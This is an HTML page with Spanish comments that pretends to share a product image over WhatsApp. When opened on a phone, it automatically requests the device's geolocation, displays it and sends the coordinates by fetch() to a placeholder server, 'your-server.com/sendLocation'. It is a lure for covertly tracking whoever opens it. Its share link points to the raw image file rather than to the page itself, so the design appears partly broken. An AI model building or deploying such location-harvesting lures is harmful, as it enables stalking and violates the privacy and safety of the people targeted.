<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Enviar Imagen y Obtener Ubicación</title>
</head>
<body>
    <h2>Enviar Imagen al Teléfono</h2>
    
    <!-- Imagen que se enviará al teléfono -->
    <h3>Imagen del Producto:</h3>
    <img id="productImage" src="Samsung-Galaxy-Tab-S10-2.jpg" alt="Producto" width="300">

    <!-- Botón para enviar imagen -->
    <p>
        <a id="sendImage" href="#" target="_blank">📩 Enviar imagen al teléfono</a>
    </p>

    <!-- Espacio para mostrar la ubicación devuelta -->
    <h2>Ubicación del Teléfono:</h2>
    <p id="location">Esperando ubicación...</p>
    <a id="mapsLink" href="#" target="_blank" style="display: none;">📍 Ver en Google Maps</a>

    <script>
        // URL de la imagen pública
        const imageUrl = "https://raw.githubusercontent.com/clentebanks/ubicacion/refs/heads/main/Samsung-Galaxy-Tab-S10-2.jpg"; // Cambia esto por la URL real de tu imagen

        // Enviar la imagen al teléfono (ejemplo con WhatsApp)
        document.getElementById("sendImage").href = `https://api.whatsapp.com/send?text=Mira esta imagen: ${imageUrl}`;

        // Función para obtener la ubicación cuando el usuario abre la página en su teléfono
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // Mostrar la ubicación en la página
                    document.getElementById("location").textContent = `Latitud: ${latitude}, Longitud: ${longitude}`;

                    // Crear un enlace a Google Maps
                    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                    const linkElement = document.getElementById("mapsLink");
                    linkElement.href = mapsLink;
                    linkElement.style.display = "block";

                    // Opcional: Enviar la ubicación a un servidor
                    fetch('https://your-server.com/sendLocation', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ latitude, longitude })
                    });

                    alert(`Ubicación enviada: Latitud: ${latitude}, Longitud: ${longitude}`);
                });
            } else {
                alert("Geolocalización no soportada en este dispositivo.");
            }
        }

        // Verificar si la página se abre en un teléfono (para enviar la ubicación)
        if (/Mobi|Android/i.test(navigator.userAgent)) {
            sendLocation();
        }
    </script>
</body>
</html>
